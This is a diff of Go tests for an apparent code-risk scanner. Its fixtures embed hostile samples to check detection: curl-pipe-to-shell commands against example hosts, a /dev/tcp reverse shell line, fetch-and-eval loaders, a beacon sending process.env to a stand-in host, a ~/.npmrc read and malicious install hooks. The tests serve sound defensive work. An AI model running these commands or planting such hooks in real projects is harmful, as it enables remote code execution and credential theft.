@@ -152,7 +152,7 @@ func TestTestsAndCISoftened(t *testing.T) {
 	dir := t.TempDir()
 	write(t, dir, map[string]string{
 		".github/workflows/ci.yml": "run: curl -fsSL https://example.com/i.sh | sh\n",
-		"tests/helpers.py":         "saved = dict(os.environ)\n",
+		"tests/helpers.py":         "saved = json.dumps(os.environ)\n",
 	})
 	r, err := Scan(context.Background(), dir, DefaultLimits)
 	if err != nil {
@@ -395,6 +395,9 @@ func TestIncompleteScans(t *testing.T) {
 		"file limit reached":       {padding, ReviewRecommended},
 		"a large setup.py":         {map[string]string{"setup.py": strings.Repeat("#\n", 1<<10)}, ReviewRecommended},
 		"a large image is no code": {map[string]string{"logo.png": "\x89PNG\r\n\x1a\n\x00" + strings.Repeat("x", 2<<10)}, NoIndicators},
+		"a large test fixture":     {map[string]string{"test/fixtures/big.json": strings.Repeat("{}\n", 1<<10)}, NoIndicators},
+		"a large fixture beside a large script": {map[string]string{"test/fixtures/big.json": strings.Repeat("{}\n", 1<<10),
+			"lib/big.js": strings.Repeat("//\n", 1<<10)}, ReviewRecommended},
 	} {
 		dir := t.TempDir()
 		write(t, dir, c.files)
@@ -452,5 +455,85 @@ func TestHTMLScriptsAreCode(t *testing.T) {
 	}
 	if r.Verdict != HighRisk {
 		t.Errorf("a script in HTML: %s %+v", r.Verdict, r.Findings)
+	}
+}
+
+// Code that only looks like a risk is not reported: a regular expression's
+// exec beside a fetch, a model's eval, prose that names a credential file,
+// and a Firebase web API key, which ships to every browser by design. The
+// behavior those rules exist for still is.
+func TestKnownFalsePositives(t *testing.T) {
+	key := "AIza" + strings.Repeat("Sy0123456789abcdefghijklmnopqrs", 2)[:35]
+	clean := map[string]string{
+		"releases.ts":     "const heading = /^## v(\\S+)/;\nexport async function load() {\n  const md = await fetch(url).then((r) => r.text());\n  for (const l of md.split('\\n')) { const h = heading.exec(l); }\n}\n",
+		"train.py":        "import requests\nweights = requests.get(URL).content\nmodel.eval()\n",
+		"page.tsx":        "export default function P() {\n  return <p>It never reads credential configs such as <code>.npmrc</code> or .netrc files.</p>;\n}\n",
+		"apphosting.yaml": "env:\n  - variable: NEXT_PUBLIC_FIREBASE_API_KEY\n    value: " + key + "\n    availability: [BUILD, RUNTIME]\n",
+		".env.example":    "VITE_FIREBASE_API_KEY=" + key + "\n",
+		"package.json": `{"scripts": {"prepare": "husky", "postinstall": "prisma generate && npm run build", "build": "del-cli dist && tsc"},
+			"devDependencies": {"husky": "9.1.7", "prisma": "6.0.0", "del-cli": "6.0.0"}}`,
+		"launch.py":               "env = os.environ.copy()\nsubprocess.run(cmd, env=env)\n",
+		"logo.ts":                 "export const logo = \"data:image/png;base64," + "iVBORw0KGgo" + strings.Repeat("AAAA", 600) + "\";\n",
+		"cmdoptions.py":           "help=\"Specify a proxy in the form scheme://[user:passwd@]proxy.server:port.\"\n",
+		"examples/session/app.js": "app.use(session({ secret: \"Kq8wZ2vRt5yX\" }));\n",
+		"tests/parse_test.go":     "var shells = []string{\"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\"}\n",
+		"tests/protocol.test.js":  "expect(parse('stratum+tcp://pool:3333')).toBe('stratum+tcp');\n",
+		"_fixture/certs/key.pem":  "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASC\n-----END PRIVATE KEY-----\n",
+		"src/firebase.ts":         "export const projectConfig = {\n  projectId: 'demo-friendly-eats',\n  apiKey: 'API_KEY_UNUSED'\n}\n",
+		"src/search.ts":           "export const ALGOLIA = {\n  indexName: \"docs\",\n  appId: \"0LE5592BV4\",\n  apiKey: \"892c4647b96fe1b3d0b7d8de1c5b5e40\",\n};\n",
+	}
+	dir := t.TempDir()
+	write(t, dir, clean)
+	r, err := Scan(context.Background(), dir, DefaultLimits)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if r.Verdict != NoIndicators {
+		t.Errorf("clean code: %s %+v", r.Verdict, r.Findings)
+	}
+	for _, f := range r.Findings {
+		if !note(f) {
+			t.Errorf("clean code: not a note: %+v", f)
+		}
+	}
+
+	risky := map[string]string{
+		"loader.js":  "const code = await fetch(url).then((r) => r.text());\neval(code);\n",
+		"loader.py":  "import urllib.request\nsrc = urllib.request.urlopen(URL).read()\nexec(src)\n",
+		"steal.js":   "const p = require('path').join(require('os').homedir(), '.npmrc');\n",
+		"config.yml": "maps:\n  GOOGLE_MAPS_KEY: " + key + "\n",
+		"beacon.js":  "fetch('https://collect.example.net', {method: 'POST', body: JSON.stringify(process.env)});\n",
+		// An install hook that runs a repository file, even a test, is judged
+		// on its own, and a risky one is high.
+		"hooks/package.json": `{"scripts": {"postinstall": "node tests/setup.test.js"}}`,
+		"risky/package.json": `{"scripts": {"prepare": "npm run fetch", "fetch": "curl -s https://x.example.net/i.sh | sh"}}`,
+	}
+	want := map[string]string{"loader.js": "safety.fetch-and-eval", "loader.py": "safety.fetch-and-eval", "steal.js": "safety.tool-credentials", "config.yml": "sec.api-token",
+		"beacon.js": "safety.env-dump", "hooks/package.json": "safety.npm-install-script", "risky/package.json": "safety.npm-install-script"}
+	dir = t.TempDir()
+	write(t, dir, risky)
+	if r, err = Scan(context.Background(), dir, DefaultLimits); err != nil {
+		t.Fatal(err)
+	}
+	got := map[string]bool{}
+	for _, f := range r.Findings {
+		got[f.Path+" "+f.Rule] = true
+	}
+	for path, rule := range want {
+		if !got[path+" "+rule] {
+			t.Errorf("%s: want %s; findings %+v", path, rule, r.Findings)
+		}
+	}
+	for _, f := range r.Findings {
+		switch {
+		case f.Rule != "safety.npm-install-script":
+		case f.Path == "hooks/package.json" && (f.Severity != Medium || note(f)):
+			t.Errorf("a hook running a repository file: %+v, want medium", f)
+		case f.Path == "risky/package.json" && f.Severity != High:
+			t.Errorf("a hook that pipes a download to a shell through npm run: %+v, want high", f)
+		}
+	}
+	if r.Verdict == NoIndicators {
+		t.Error("risky code got no indicators")
 	}
 }
